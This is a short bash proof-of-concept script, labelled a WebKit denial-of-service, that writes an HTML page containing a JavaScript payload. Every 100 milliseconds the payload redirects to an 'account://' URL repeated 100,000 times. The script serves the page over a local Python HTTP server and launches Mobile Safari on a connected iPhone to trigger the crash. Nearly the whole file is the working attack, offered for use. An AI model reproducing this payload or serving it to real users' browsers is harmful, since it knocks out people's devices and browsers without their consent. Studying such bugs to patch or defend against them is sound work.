#!/usr/bin/env bash

######################################
##     Webkit Denial of Service     ##
##    Created by Sem Voigtl√§nder    ##
##  Licended under the MIT License  ##
######################################

if [ $# -ne 1 ]; then
  echo "Usage: $0 [LPORT]";
  exit;
fi

LHOST="localhost"
LPORT="$1"
mkdir -p /tmp/wk_09_2018
cd /tmp/wk_09_2018
touch index.html
echo "<script type='text/javascript'>setInterval(function(){window.location.href='account://'.repeat(100000);},100);</script>" > index.html
echo "Please visit http://$LHOST:$LPORT/ on your iPhone to trigger the bug."
idevicedebug -d run com.apple.mobilesafari &
sudo python -m SimpleHTTPServer $LPORT
